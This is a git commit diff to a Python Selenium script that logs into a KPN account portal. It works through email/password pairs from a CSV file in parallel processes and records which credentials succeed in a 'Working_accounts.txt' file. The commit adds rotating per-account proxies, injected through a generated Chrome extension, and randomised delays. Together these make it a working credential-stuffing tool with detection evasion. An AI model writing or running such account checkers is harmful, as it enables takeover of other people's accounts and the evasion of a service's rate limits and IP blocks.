de54a96b36a88609a636ebd0580357f29c97555e
Salman ELKABIBI <salman.elkabibi@mavistro.com>
2021-11-05 17:32:04 +0100

    add proxy

--- login_script.py
+++ login_script.py
@@ -10,14 +10,15 @@ from selenium.webdriver.common.action_chains import ActionChains
 from selenium.webdriver.chrome.options import Options as c_Options
 from multiprocessing import Process
 from multiprocessing import freeze_support
+import zipfile
+import math
 
 global PATH_chrome, PATH_firefox, PATH_comodo
 PATH_chrome = ".\\chromedriver.exe"
-chrome_options = webdriver.ChromeOptions()
 
 def login(email,password):
-    driver = webdriver.Chrome(executable_path=PATH_chrome, options=chrome_options)
     driver.get("https://inloggen.kpn.com/")
+    # driver.get("https://myip.com/")
     time.sleep(5)
     try:
         c = driver.find_element_by_id('onetrust-accept-btn-handler')
@@ -40,37 +41,182 @@ def login(email,password):
 
     time.sleep(2)
 
-    n = driver.find_elements_by_class_name("notification-text")
-    if(not n):
+    try:
+        n = driver.find_elements_by_class_name("notification-text")
+
         print("[Login Status] : Login Success")
         f = open(".\\Working_accounts.txt", "a+")
         f.write("Email : " + email + " | Password : " + password + "\n\r")
         f.close()
-    else:
+        time.sleep(4)
+
+    except Exception as e:
+        print(e)
         print("[Login Status] : Login Failed")
         f = open(".\\Not_working_accounts.txt", "a+")
         f.write("Email : " + email + " | Password : " + password + "\n\r")
         f.close()
 
+    try:
+        profile = WebDriverWait(driver, 30).until(
+            EC.visibility_of_element_located((By.XPATH, "//span[contains(text(),'Profiel')]")))
+        print(profile)
+        time.sleep(random.uniform(1, 2))
+        ActionChains(driver).move_to_element(profile).click(profile).perform()
+        time.sleep(random.uniform(6, 7))
+        logout = WebDriverWait(driver, 30).until(
+            EC.visibility_of_element_located((By.XPATH, "//button[@id='logoutButton']")))
+        time.sleep(random.uniform(1, 2))
+        ActionChains(driver).move_to_element(logout).click(logout).perform()
+        print('[Status] : Login & Logout done successfully')
+    except Exception as e:
+        print('[ERROR] :',e)
+
 
     time.sleep(3)
     driver.close()
+def isNaN(string):
+    return string != string
+def init_browser(ip,port,p_user,p_password):
+    PROXY_HOST = ip
+    PROXY_PORT = port
+    PROXY_USER = p_user
+    PROXY_PASS = p_password
+
+    print(isNaN(PROXY_HOST),isNaN(PROXY_PORT),isNaN(PROXY_USER),isNaN(PROXY_PASS))
+
+    manifest_json = """
+        {
+            "version": "1.0.0",
+            "manifest_version": 2,
+            "name": "Chrome Proxy",
+            "permissions": [
+                "proxy",
+                "tabs",
+                "unlimitedStorage",
+                "storage",
+                "<all_urls>",
+                "webRequest",
+                "webRequestBlocking"
+            ],
+            "background": {
+                "scripts": ["background.js"]
+            },
+            "minimum_chrome_version":"22.0.0"
+        }
+        """
+
+    background_js = """
+        var config = {
+                mode: "fixed_servers",
+                rules: {
+                  singleProxy: {
+                    scheme: "http",
+                    host: "%s",
+                    port: parseInt(%s)
+                  },
+                  bypassList: ["localhost"]
+                }
+              };
+
+        chrome.proxy.settings.set({value: config, scope: "regular"}, function() {});
+
+        function callbackFn(details) {
+            return {
+                authCredentials: {
+                    username: "%s",
+                    password: "%s"
+                }
+            };
+        }
+
+        chrome.webRequest.onAuthRequired.addListener(
+                    callbackFn,
+                    {urls: ["<all_urls>"]},
+                    ['blocking']
+        );
+        """ % (PROXY_HOST, PROXY_PORT, PROXY_USER, PROXY_PASS)
+
+    background_js_1 = """
+        var config = {
+                mode: "fixed_servers",
+                rules: {
+                  singleProxy: {
+                    scheme: "http",
+                    host: "%s",
+                    port: parseInt(%s)
+                  },
+                  bypassList: ["localhost"]
+                }
+              };
+
+        chrome.proxy.settings.set({value: config, scope: "regular"}, function() {});
+
+        """ % (PROXY_HOST, PROXY_PORT)
+    global driver
+
+    if isNaN(ip) == True and isNaN(port) == True and isNaN(p_user) == True and isNaN(p_password) == True:
+        print('[Browser] Chrome without proxy : Activated')
+        chrome_options = webdriver.ChromeOptions()
+        driver = webdriver.Chrome(executable_path=PATH_chrome, options=chrome_options)
+
+    elif isNaN(p_user) == True and isNaN(p_password) == True :
+        proxy_ip_port = str(ip) + ':' + str(port)
+
+        print('[Browser] Chrome proxy : Activated')
+        chrome_options = webdriver.ChromeOptions()
+        use_proxy = True
+        user_agent = None
+        if use_proxy:
+            pluginfile = 'proxy_plugin.zip'
+            with zipfile.ZipFile(pluginfile, 'w') as zp:
+                zp.writestr("manifest.json", manifest_json)
+                zp.writestr("background.js", background_js_1)
+            chrome_options.add_extension(pluginfile)
+        if user_agent:
+            chrome_options.add_argument('--user-agent=%s' % user_agent)
+        driver = webdriver.Chrome(executable_path=PATH_chrome, options=chrome_options)
+
+    else:
+        print('[Browser] Chrome proxy with auth : Activated')
+        chrome_options = webdriver.ChromeOptions()
+        use_proxy = True
+        user_agent = None
+        if use_proxy:
+            pluginfile = 'proxy_auth_plugin.zip'
+            with zipfile.ZipFile(pluginfile, 'w') as zp:
+                zp.writestr("manifest.json", manifest_json)
+                zp.writestr("background.js", background_js)
+            chrome_options.add_extension(pluginfile)
+        if user_agent:
+            chrome_options.add_argument('--user-agent=%s' % user_agent)
+        driver = webdriver.Chrome(executable_path=PATH_chrome, options=chrome_options)
+
+    return driver
+
+def run(email,password,ip,port,p_user,p_password):
+    init_browser(ip,port,p_user,p_password)
+    login(email,password)
 
 def launch(n):
     data = pd.read_csv('.\\data.csv',sep=';')
 
     emails = data['Email'].tolist()
     passwords = data['Password'].tolist()
+    ips = data['ip'].tolist()
+    ports = data['port'].tolist()
+    p_users = data['p_user'].tolist()
+    p_passwords = data['p_password'].tolist()
     processes = []
 
     while (len(emails) != 0):
         for i in range(int(n)):
-            p = Process(target=login, args=(emails[0], passwords[0]))
+            p = Process(target=run, args=(emails[0], passwords[0], ips[0], ports[0], p_users[0], p_passwords[0]))
             p.start()
             time.sleep(random.uniform(1, 2))
             processes.append(p)
 
-            emails.remove(emails[0]), passwords.remove(passwords[0])
+            emails.remove(emails[0]), passwords.remove(passwords[0]), ips.remove(ips[0]), ports.remove(ports[0]), p_users.remove(p_users[0]), p_passwords.remove(p_passwords[0])
 
         for process in processes:
             process.join()
